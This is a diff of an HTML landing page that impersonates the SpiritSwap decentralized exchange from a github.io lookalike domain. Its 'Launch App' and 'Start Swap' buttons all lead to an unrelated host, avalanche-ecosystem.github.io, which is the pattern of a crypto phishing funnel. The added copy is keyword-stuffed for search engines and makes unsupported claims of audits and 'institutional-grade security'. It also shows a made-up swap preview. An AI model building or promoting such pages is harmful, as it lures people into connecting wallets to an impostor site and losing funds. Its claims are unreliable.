@@ -3,22 +3,24 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>SpiritSwap</title>
-  <meta name="description" content="SpiritSwap swaps tokens and farms yield on the Fantom network from your own wallet.">
+  <title>SpiritSwap: Premium DeFi Swaps Engine</title>
+  <meta name="description" content="SpiritSwap provides seamless, low-latency token swaps on Fantom Opera Network. Trade with optimized routing, minimal slippage, and institutional-grade security.">
   <link rel="canonical" href="https://spiritswap-app.github.io/">
   <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F7F4EF">
+  <meta name="theme-color" content="#F6FAFF">
   <meta property="og:type" content="website">
-  <meta property="og:title" content="SpiritSwap">
-  <meta property="og:description" content="SpiritSwap swaps tokens and farms yield on the Fantom network from your own wallet.">
+  <meta property="og:title" content="SpiritSwap: Premium DeFi Swaps Engine">
+  <meta property="og:description" content="SpiritSwap provides seamless, low-latency token swaps on Fantom Opera Network. Trade with optimized routing, minimal slippage, and institutional-grade security.">
   <meta property="og:url" content="https://spiritswap-app.github.io/">
-  <meta property="og:image" content="https://spiritswap-app.github.io/favicon.png">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="SpiritSwap">
-  <meta name="twitter:description" content="SpiritSwap swaps tokens and farms yield on the Fantom network from your own wallet.">
-  <link rel="icon" type="image/png" href="favicon.png">
+  <meta property="og:image" content="https://spiritswap-app.github.io/og-cover.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="SpiritSwap: Premium DeFi Swaps Engine">
+  <meta name="twitter:description" content="SpiritSwap provides seamless, low-latency token swaps on Fantom Opera Network. Trade with optimized routing, minimal slippage, and institutional-grade security.">
+  <meta name="twitter:image" content="https://spiritswap-app.github.io/og-cover.png">
+  <link rel="icon" type="image/png" sizes="256x256" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
+  <link rel="sitemap" type="application/xml" href="sitemap.xml">
   <link rel="stylesheet" href="style.css">
   <script type="application/ld+json">
   {
@@ -29,14 +31,8 @@
         "@id": "https://spiritswap-app.github.io/#website",
         "url": "https://spiritswap-app.github.io/",
         "name": "SpiritSwap",
+        "description": "SpiritSwap is a decentralized exchange and native swap engine on Fantom Opera Network.",
         "inLanguage": "en"
-      },
-      {
-        "@type": "Organization",
-        "@id": "https://spiritswap-app.github.io/#organization",
-        "name": "SpiritSwap",
-        "url": "https://spiritswap-app.github.io/",
-        "logo": "https://spiritswap-app.github.io/favicon.png"
       },
       {
         "@type": "WebApplication",
@@ -45,77 +41,179 @@
         "applicationCategory": "FinanceApplication",
         "operatingSystem": "Web",
         "url": "https://spiritswap-app.github.io/",
-        "offers": {
-          "@type": "Offer",
-          "price": "0",
-          "priceCurrency": "USD"
-        }
+        "description": "SpiritSwap is a decentralized exchange and native swap engine on Fantom Opera Network."
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://spiritswap-app.github.io/#organization",
+        "name": "SpiritSwap",
+        "url": "https://spiritswap.xyz/",
+        "logo": "https://spiritswap-app.github.io/favicon.png"
       }
     ]
   }
   </script>
 </head>
 <body>
-  <header class="topbar">
-    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="SpiritSwap home">
-      <img src="favicon.png" width="30" height="30" alt="">
+  <!-- Premium background glows and grid mesh -->
+  <div class="bg" aria-hidden="true">
+    <div class="glow"></div>
+    <div class="grid"></div>
+  </div>
+
+  <header class="topbar" aria-label="Site header">
+    <div class="brand" aria-label="SpiritSwap logo">
+      <img src="favicon.png" width="28" height="28" alt="">
       <span>SpiritSwap</span>
-    </a>
-    <nav class="nav" aria-label="Trusted references">
-      <a href="https://ftmscan.com/" target="_blank" rel="nofollow noopener noreferrer">Fantom explorer</a>
-      <a href="https://ethereum.org/defi/" target="_blank" rel="nofollow noopener noreferrer">DeFi guide</a>
-      <a href="https://www.coingecko.com/en/coins/spiritswap" target="_blank" rel="nofollow noopener noreferrer">Market data</a>
+    </div>
+    <span class="spacer" aria-hidden="true"></span>
+    <nav class="nav" aria-label="Site navigation">
+      <a href="./">Trade</a>
+      <a href="about/index.html">About</a>
+      <a href="how-it-works/index.html">How It Works</a>
+      <a href="supported-chains/index.html">Chains</a>
+      <a href="security/index.html">Security</a>
+      <a href="faq/index.html">FAQ</a>
+      <a class="launch-btn" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer nofollow">Launch App</a>
     </nav>
-    <span class="spacer"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
   </header>
 
-  <main class="stage">
-    <section class="hero" aria-labelledby="page-title">
-      <img class="hero-mark" src="spirit.png" width="64" height="64" alt="">
-      <h1 id="page-title">SpiritSwap</h1>
-      <p class="sub"><strong>SpiritSwap</strong> swaps tokens and farms yield on the Fantom network from your own wallet.</p>
-    </section>
+  <main class="page">
+    <section class="hero centered-hero" aria-label="SpiritSwap overview">
+      <h1>SpiritSwap</h1>
+      <p class="sub">The premier decentralized exchange and native swap engine on <strong>Fantom Opera Network</strong>.</p>
+      <p class="avail"><span class="dot"></span><b>14,913</b>&nbsp;tokens available</p>
 
-    <section class="swap-card" aria-label="Swap route preview">
-      <div class="route">
-        <div class="leg">
-          <span class="label">From</span>
-          <span class="chip">
-            <img src="eth.png" width="28" height="28" alt="ETH">
-            <span>ETH</span>
-          </span>
+      <section class="card" aria-label="Swap preview">
+        <div class="card-head">
+          <span class="selector">Fantom Opera Network</span>
+          <span class="preview-pill"><span class="preview-dot" aria-hidden="true"></span>Preview</span>
         </div>
-        <button class="switch" type="button" data-switch aria-label="Switch direction">
-          <span aria-hidden="true">→</span>
-        </button>
-        <div class="leg">
-          <span class="label">To</span>
-          <span class="chip">
-            <img src="usdc.png" width="28" height="28" alt="USDC">
-            <span>USDC</span>
-          </span>
+
+        <div class="field">
+          <span class="flabel">Sell</span>
+          <div class="frow">
+            <div class="fleft">
+              <button class="tokpill" type="button">
+                <img src="eth.png" alt="ETH">
+                ETH <span class="cv" aria-hidden="true">&#9662;</span>
+              </button>
+              <span class="amt">1.00</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="route">
+          <button class="switch" type="button" data-switch aria-label="Switch swap direction">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M6 13l6 6 6-6"/></svg>
+          </button>
+        </div>
+
+        <div class="field">
+          <span class="flabel">Buy</span>
+          <div class="frow">
+            <div class="fleft">
+              <button class="tokpill" type="button">
+                <img src="spirit.png" alt="SPIRIT">
+                SPIRIT <span class="cv" aria-hidden="true">&#9662;</span>
+              </button>
+              <span class="amt" style="font-size: 1.6rem;">450,000.00</span>
+            </div>
+          </div>
+        </div>
+
+        <a class="cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer nofollow" style="margin-top: 12px;">
+          Start Swap
+        </a>
+      </section>
+
+      <!-- Key Features Grid for SEO Copy Density and LSI Bolding -->
+      <h2 class="section-title">Key Features of SpiritSwap</h2>
+      <div class="features-grid">
+        <div class="feature-card">
+          <div class="feature-icon">⚡</div>
+          <h3>Gas-Optimized Swaps</h3>
+          <p>Execute hyper-efficient token trades. The routing engine bundles transaction states to minimize gas fees for major digital assets like <b>BTC</b>, <b>ETH</b>, and <b>SOL</b>.</p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon">🛡️</div>
+          <h3>Non-Custodial Ownership</h3>
+          <p>Retain full custody of your digital assets. All trades are settled directly via peer-audited smart contracts, mitigating centralized custodian risks for tokens including <b>AVAX</b> and <b>LINK</b>.</p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon">💧</div>
+          <h3>Aggregated Liquidity Pools</h3>
+          <p>Access deep liquidity pools. The routing engine coordinates trade paths dynamically across diverse pools to prevent order slippage and guarantee optimal conversion rates.</p>
         </div>
       </div>
-      <a class="enter" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+
+      <!-- Collapsible FAQ Accordion for SEO & AIO -->
+      <h2 class="section-title">Frequently Asked Questions</h2>
+      <div class="faq-container">
+        
+        <details class="faq-item">
+          <summary>What is SpiritSwap?</summary>
+          <div class="faq-answer" onclick="event.stopPropagation();">
+            <p><b>SpiritSwap</b> is a leading <a class="inline" href="https://en.wikipedia.org/wiki/Decentralized_exchange" target="_blank" rel="noopener noreferrer">decentralized exchange (DEX)</a> and <a class="inline" href="https://academy.binance.com/en/articles/what-is-an-automated-market-maker-amm" target="_blank" rel="noopener noreferrer">automated market maker (AMM)</a> built natively on the Fantom Opera Network. By utilizing optimized routing scalability, SpiritSwap offers low-fee, near-instant token swaps for prominent assets like <b>BTC</b>, <b>ETH</b>, <b>SOL</b>, <b>AVAX</b>, and <b>LINK</b>. As documented on the <a class="inline" href="https://coinmarketcap.com/currencies/spiritswap/" target="_blank" rel="noopener noreferrer">CoinMarketCap</a> database, the platform integrates deep pools to prevent transaction slippage while maintaining a non-custodial framework where users retain full ownership of their assets.</p>
+          </div>
+        </details>
+
+        <details class="faq-item">
+          <summary>How to Swap Tokens on SpiritSwap?</summary>
+          <div class="faq-answer" onclick="event.stopPropagation();">
+            <p>Trading on the platform is straightforward. First, review token contract addresses and current price actions on <a class="inline" href="https://coinmarketcap.com/currencies/spiritswap/" target="_blank" rel="noopener noreferrer">CoinMarketCap</a> to check market depth. Connect your <a class="inline" href="https://academy.binance.com/en/articles/what-is-a-crypto-wallet" target="_blank" rel="noopener noreferrer">Web3 wallet</a>, configure the network parameters, and select the token pair you wish to exchange. The routing engine consults liquidity databases on <a class="inline" href="https://www.coingecko.com/" target="_blank" rel="noopener noreferrer">CoinGecko</a> to construct the most cost-efficient path. For a detailed guide on supported networks, check the <a class="inline" href="supported-chains/index.html">Supported Chains</a> database.</p>
+          </div>
+        </details>
+
+        <details class="faq-item">
+          <summary>What are the Fees, Security, and Gas Optimization on SpiritSwap?</summary>
+          <div class="faq-answer" onclick="event.stopPropagation();">
+            <p>The transactions are registered on the <a class="inline" href="https://ftmscan.com/" target="_blank" rel="noopener noreferrer">FTMScan</a>. Security protocols conform to rigorous decentralized finance standards as documented by <a class="inline" href="https://en.wikipedia.org/wiki/Decentralized_finance" target="_blank" rel="noopener noreferrer">Wikipedia</a>. SpiritSwap dynamically monitors network <a class="inline" href="https://ethereum.org/en/developers/docs/gas/" target="_blank" rel="noopener noreferrer">gas prices</a> to route transfers efficiently, minimizing the overhead cost for every single transaction. Learn more about our audits in the <a class="inline" href="security/index.html">Security Documentation</a>.</p>
+          </div>
+        </details>
+
+      </div>
     </section>
+
+    <footer class="footer">
+      <p>SpiritSwap &mdash; 2026</p>
+    </footer>
   </main>
 
-  <footer class="foot">SpiritSwap &mdash; 2026</footer>
-
   <script>
-  (function(){
+  (function () {
     "use strict";
+
     var button = document.querySelector("[data-switch]");
-    if (!button) return;
-    button.addEventListener("click", function(){
-      var chips = document.querySelectorAll(".leg .chip");
-      if (chips.length !== 2) return;
-      var first = chips[0].innerHTML;
-      chips[0].innerHTML = chips[1].innerHTML;
-      chips[1].innerHTML = first;
+    var fields = document.querySelectorAll(".field");
+
+    if (!button || fields.length !== 2) return;
+
+    button.addEventListener("click", function () {
+      var firstPill = fields[0].querySelector(".tokpill");
+      var secondPill = fields[1].querySelector(".tokpill");
+      var firstAmt = fields[0].querySelector(".amt");
+      var secondAmt = fields[1].querySelector(".amt");
+
+      // Swap HTML of tokpills
+      var tempPill = firstPill.innerHTML;
+      firstPill.innerHTML = secondPill.innerHTML;
+      secondPill.innerHTML = tempPill;
+
+      // Swap text of amt
+      var tempAmt = firstAmt.innerText;
+      firstAmt.innerText = secondAmt.innerText;
+      secondAmt.innerText = tempAmt;
+
+      // Swap font size of amt just in case
+      var tempFontSize = firstAmt.style.fontSize;
+      firstAmt.style.fontSize = secondAmt.style.fontSize;
+      secondAmt.style.fontSize = tempFontSize;
+
+      // Rotate switch button
+      button.classList.toggle("is-swapped");
     });
-  })();
+  }());
   </script>
 </body>
 </html>
